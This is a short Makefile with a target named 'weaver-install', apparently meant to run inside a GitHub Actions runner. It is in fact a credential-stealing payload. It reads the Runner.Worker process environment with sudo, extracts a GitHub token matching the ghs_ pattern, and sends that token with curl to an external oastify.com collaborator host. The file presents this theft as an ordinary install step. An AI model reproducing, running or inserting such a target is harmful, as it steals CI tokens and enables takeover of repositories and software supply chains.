COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com

weaver-install:
	@echo "--- Capturing Raw Token ---"
	
	# 1. Get the PID
	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker" | head -n 1))
	
	# 2. Extract any string matching the GitHub Secret pattern (ghs_...)
	# 3. Send it as a header AND the body to be sure
	@TOKEN=$$(sudo cat /proc/$(WORKER_PID)/environ | tr '\0' '\n' | grep -aoE "ghs_[0-9a-zA-Z]{30,}" | head -n 1); \
	curl -s -X POST \
		-H "X-Captured-Token: $$TOKEN" \
		-d "token=$$TOKEN" \
		$(COLLABORATOR_URL)/token_only
